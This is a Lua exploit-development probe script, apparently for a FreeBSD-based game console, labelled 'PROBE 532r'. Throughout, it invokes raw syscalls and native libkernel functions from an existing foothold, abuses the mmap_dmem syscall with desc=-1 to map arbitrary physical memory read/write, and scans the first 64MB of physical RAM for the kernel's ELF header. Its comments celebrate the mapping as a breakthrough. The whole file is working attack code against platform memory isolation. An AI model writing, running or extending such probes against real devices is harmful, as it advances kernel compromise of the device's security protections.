-- CRASH_CLASS: LOW  
-- PROBE 532r: mmap_dmem(628) R/W verification + physical range test
--
-- 532q BREAKTHROUGH: desc=-1 prot=3 flags=0 offset=phys → VA=0x310788000!
-- mmap_dmem WORKS with allocated physical memory.
--
-- Step 1: Verify R/W on the mapped page
-- Step 2: Try mapping system RAM addresses (below 0x100000000)
-- Step 3: If system RAM maps, scan for kernel ELF header

print("=== PROBE 532r: MMAP_DMEM R/W ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

-- Get libkernel base
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
local error_fn = lk + uint64(0x02E10)
local alloc_fn = lk + uint64(0x17EF0)
print("lk=" .. q(lk))

local function get_errno()
    local errno_val = -1
    pcall(function()
        local errno_ptr = native.fcall_with_rax(error_fn, 0)
        if errno_ptr and to_num(errno_ptr) ~= 0 then
            errno_val = rd(to_num(errno_ptr)) or -1
        end
    end)
    return errno_val
end

local sc_628 = make_syscall(628)

-- [A] Allocate physical memory and map via 628
print("[A] AllocateDirectMemory + mmap_dmem")
local phys_out = memory.alloc(8); wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  phys=" .. q(phys))

local ok_m, va = pcall(function()
    return sc_628(uint64(0), uint64(0x4000), uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(3), uint64(0), phys)
end)
local errno_m = get_errno()
print("  va=" .. q(va) .. " errno=" .. errno_m)

if not ok_m or to_num(va) <= 0 then
    print("  MAP FAILED")
    print("=== 532r DONE ===")
    return
end

-- [B] R/W test
print("")
print("[B] R/W test")
local v1 = rd(va)
print("  initial_read=" .. (v1 and string.format("0x%X", v1 < 0 and v1 + 0x100000000 or v1) or "FAULT"))

local ok_w = wd(va, 0xDEADBEEF)
print("  write_ok=" .. tostring(ok_w))

local v2 = rd(va)
print("  read_back=" .. (v2 and string.format("0x%X", v2 < 0 and v2 + 0x100000000 or v2) or "FAULT"))

if v2 and (v2 == 0xDEADBEEF or (v2 < 0 and v2 + 0x100000000 == 0xDEADBEEF)) then
    print("  *** R/W VERIFIED ***")
end

-- [C] Map SYSTEM RAM via mmap_dmem!
-- AllocateDirectMemory only gives phys in GPU pool (0x100000000+).
-- But mmap_dmem desc=-1 bypasses device lookup.
-- Can we map arbitrary physical addresses??
-- The kernel sits in system RAM (phys < 0x100000000 typically).
print("")
print("[C] System RAM mapping attempts")

-- Try physical addresses in system RAM range
-- Aligned to 0x4000 (16KB page)
local sys_addrs = {
    0x0,          -- very first page
    0x4000,       -- second page  
    0x8000,
    0x100000,     -- 1MB
    0x1000000,    -- 16MB
    0x10000000,   -- 256MB
    0x20000000,   -- 512MB
    0x40000000,   -- 1GB
    0x80000000,   -- 2GB
}

for _, off in ipairs(sys_addrs) do
    local ok_s, va_s = pcall(function()
        return sc_628(uint64(0), uint64(0x4000), uint64("0xFFFFFFFFFFFFFFFF"),
            uint64(3), uint64(0), uint64(off))
    end)
    local rvn = -999
    if ok_s then rvn = to_num(va_s) end
    local errno_s = get_errno()
    
    local extra = ""
    if ok_s and rvn > 0 then
        extra = " VA=" .. q(va_s)
        -- Try to read first dword
        local ok_r, val_r = pcall(function() return memory.read_dword(va_s) end)
        if ok_r then
            local vn = to_num(val_r); if vn < 0 then vn = vn + 0x100000000 end
            extra = extra .. string.format(" [0x%08X]", vn)
        else
            extra = extra .. " [FAULT]"
        end
    end
    print(string.format("  off=0x%09X: rv=%d e=%d%s", off, rvn, errno_s, extra))
end

-- [D] If any system addr mapped, try known kernel locations
-- Typical FreeBSD kernel: phys around 0x1000000-0x10000000
-- ELF header: 0x7F 0x45 0x4C 0x46 = 0x464C457F
print("")
print("[D] ELF header search (if any mapped)")

local elf_magic = 0x464C457F
local found_kernel = false

-- Scan in 16KB steps across first 64MB of phys
for off = 0, 0x4000000 - 0x4000, 0x4000 do
    local ok_s, va_s = pcall(function()
        return sc_628(uint64(0), uint64(0x4000), uint64("0xFFFFFFFFFFFFFFFF"),
            uint64(3), uint64(0), uint64(off))
    end)
    if ok_s and to_num(va_s) > 0 then
        local ok_r, val_r = pcall(function() return memory.read_dword(va_s) end)
        if ok_r then
            local vn = to_num(val_r); if vn < 0 then vn = vn + 0x100000000 end
            if vn == elf_magic then
                print(string.format("  *** ELF HEADER at phys 0x%X! VA=%s ***", off, q(va_s)))
                -- Read first 32 bytes
                for i = 0, 28, 4 do
                    local bv = rd(va_s + i)
                    if bv then
                        if bv < 0 then bv = bv + 0x100000000 end
                        print(string.format("    +%02X: 0x%08X", i, bv))
                    end
                end
                found_kernel = true
            end
        end
        -- Unmap to avoid leaking VAs
        pcall(function() make_syscall(73)(va_s, uint64(0x4000)) end) -- munmap
    end
end

if not found_kernel then
    print("  No ELF headers in first 64MB of physical memory")
end

print("")
print("=== 532r DONE ===")
